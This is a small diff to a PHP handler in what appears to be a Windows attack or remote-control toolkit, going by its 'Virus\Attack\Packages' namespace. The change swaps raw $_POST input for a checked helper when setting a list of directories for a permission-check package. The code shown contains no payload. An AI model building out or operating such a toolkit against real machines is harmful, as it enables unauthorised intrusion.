@@ -1,6 +1,8 @@
 <?php
 
-$directories = $this->requestData->postCheck("directories");
+use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CheckPermission;
 
-$this->setDirectories($_POST["directories"]);
+/** @var CheckPermission $this */
+
+$this->setDirectories($this->requestData->postCheck("directories"));
 $this->saveState();
